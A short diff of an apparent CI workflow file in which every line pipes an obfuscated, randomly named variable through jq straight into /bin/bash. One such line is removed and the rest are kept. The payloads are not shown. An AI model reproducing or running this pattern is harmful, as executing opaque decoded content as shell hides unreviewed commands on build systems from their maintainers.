@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$pckey0" | jq -r .phxgd0 | /bin/bash
           printf '%s' "$zpzv20" | jq -r .ej1180 | /bin/bash
           echo $ndhxj03 | jq -r .si895 | /bin/bash
-          printf '%s' "$w5" | jq -r .dw428 | /bin/bash
           printf '%s' "$fj29" | jq -r .bi4161 | /bin/bash
           echo $u914 | jq -r .sidhb88 | /bin/bash
           echo $q81271 | jq -r .ipkc27729 | /bin/bash
